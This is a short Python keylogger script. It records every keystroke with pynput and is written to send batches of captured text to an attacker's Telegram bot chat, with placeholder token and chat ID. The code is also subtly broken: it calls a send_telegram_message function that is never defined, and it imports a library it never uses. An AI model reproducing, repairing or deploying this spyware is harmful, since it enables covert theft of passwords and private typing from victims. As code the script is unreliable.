import pyautogui
import time
import telebot
from pynput.keyboard import Listener, Key

# Enter your bot token and chat id here
BOT_TOKEN = 'bot_token'
CHAT_ID = 'chat_id'

# Initialize the Telegram bot
bot = telebot.TeleBot(BOT_TOKEN)

accumulated_keystrokes = ''
last_keystroke_time = time.time()

# Define a function to record keystrokes
def record_keystrokes(key):
    global last_keystroke, accumulated_keystrokes, last_keystroke_time, current_time
    try:
        last_keystroke = str(key.char)
    except AttributeError:
        if key == Key.space:
            last_keystroke = ' '
        else:
            last_keystroke = str(key)

    if last_keystroke is not None:
        accumulated_keystrokes += last_keystroke
        current_time = time.time()
        if len(accumulated_keystrokes) >= 100 or current_time - last_keystroke_time >= 100:
            send_telegram_message(accumulated_keystrokes)
            accumulated_keystrokes = ''
            last_keystroke_time = current_time

# Define a key listener function
def on_press(key):
    record_keystrokes(key)

# Start the key listener
with Listener(on_press=on_press) as listener:
    listener.join()